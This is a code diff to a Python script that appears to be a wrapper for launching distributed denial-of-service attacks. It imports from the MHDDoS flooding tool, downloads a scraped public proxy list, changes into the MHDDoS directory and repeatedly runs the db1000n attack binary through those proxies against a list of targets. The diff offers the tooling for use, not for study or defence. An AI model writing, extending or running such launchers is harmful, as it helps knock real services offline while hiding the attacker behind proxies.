@@ -8,6 +8,7 @@ from concurrent.futures import ThreadPoolExecutor, as_completed
 from multiprocessing import cpu_count
 
 import requests
+from MHDDoS.start import logger, Methods
 from PyRoxy import Proxy
 
 PROXIES_URL = 'https://raw.githubusercontent.com/porthole-ascend-cinnamon/proxy_scraper/main/proxies.txt'
@@ -104,7 +105,7 @@ def update_proxies(period, targets):
 
 
 def start(period, targets):
-    # os.chdir('MHDDoS')
+    os.chdir('MHDDoS')
     while True:
         resolved = list(targets)
         if not resolved:
@@ -114,7 +115,7 @@ def start(period, targets):
         no_proxies = all(target.lower().startswith('udp://') for target in resolved)
         if not no_proxies:
             update_proxies(period, resolved)
-        cmd = './db1000n'
+        cmd = './db1000n --proxy ../files/proxies.txt'
         os.system(cmd)
 
 
